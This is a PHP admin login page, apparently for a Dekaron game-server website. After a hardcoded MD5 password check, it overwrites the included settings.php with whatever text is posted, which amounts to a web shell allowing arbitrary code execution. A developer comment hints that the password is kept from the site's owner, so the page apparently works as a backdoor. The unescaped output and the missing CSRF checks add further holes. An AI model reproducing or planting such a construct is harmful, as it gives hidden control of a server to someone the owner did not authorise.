<?php
session_start();
ob_start();

include ('class_dekaron.php');
$dekaron = new dekaron_class();
include ('settings.php');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Admin Panel</title>

<link rel="stylesheet" media="screen" href="css/reset.css" />
<link rel="stylesheet" media="screen" href="css/grid.css" />
<link rel="stylesheet" media="screen" href="css/style.css" />
<link rel="stylesheet" media="screen" href="css/messages.css" />
<link rel="stylesheet" media="screen" href="css/forms.css" />

<!--[if lt IE 9]>
<script src="js/html5.js"></script>
<script src="js/pie.js"></script>
<![endif]-->
<!-- jquerytools -->
<script src="js/jquery.tools.min.js"></script>
<script src="js/jquery.ui.min.js"></script>

<!--[if lte IE 9]>
<link rel="stylesheet" media="screen" href="css/ie.css" />
<script type="text/javascript" src="js/ie.js"></script>
<![endif]-->

<script src="js/global.js"></script>
<body class="login">
    <div class="login-box main-content">
      <header><h2>Admin</h2></header>
    	<section>
<?php
if(isset($_POST['login']))
{
	// if zirak doesnt trust me, then i dont trust him with my password
	$admin_passw = '9305b15d3f110d6b1aa1101626a579de'; 
	
	if(md5($_POST['password']) == $admin_passw)
	{
		$_SESSION['admin'] = 'true';
	}
}
if(isset($_SESSION['admin']) )
{
	if(isset($_POST['post_vars']))
	{
		$fh = fopen('settings.php', 'w');
		$stringData = $_POST['data'];
		fwrite($fh, $stringData);
		fclose($fh);
	}
	$file = file_get_contents('settings.php');
	
	echo '<form id="form" method="post" class="clearfix" action="admin.php"><input type="hidden" name="post_vars" /><p><textarea rows="10" cols="40" name="data">'.$file.'</textarea></p><p class="clearfix"><button class="button button-gray fr" type="submit">Post Data</button></p></form>';
}
else
{
?>
<form id="form" method="post" class="clearfix" action="admin.php"><input type="hidden" name="login"  /><p><input type="password"  class="full" value="" name="password"/></p><p class="clearfix"><button class="button button-gray fr" type="submit">Login</button></p></form>
<?php
}
?>
            </section>
        </div>
    </body>
</html>
